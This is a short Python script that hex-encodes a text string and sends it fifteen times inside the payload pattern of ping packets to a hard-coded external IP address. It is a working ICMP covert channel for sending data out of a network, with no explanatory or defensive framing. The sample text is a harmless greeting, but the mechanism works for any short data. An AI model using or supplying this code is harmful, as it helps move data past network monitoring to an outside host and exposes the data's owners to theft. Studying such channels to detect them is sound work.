import sys, subprocess
text = "hello my brother"
target = "31.2.157.119"
if len(text)>16:
    print("Text too long!")
    exit()
enctext = r''.join( hex(ord(c)).split("x")[1] for c in text )
ping_count = 15
print(enctext)
for _ in range(ping_count): 
    out = subprocess.check_output(["ping", "-p", enctext, "-c", "1", target])
    print(out)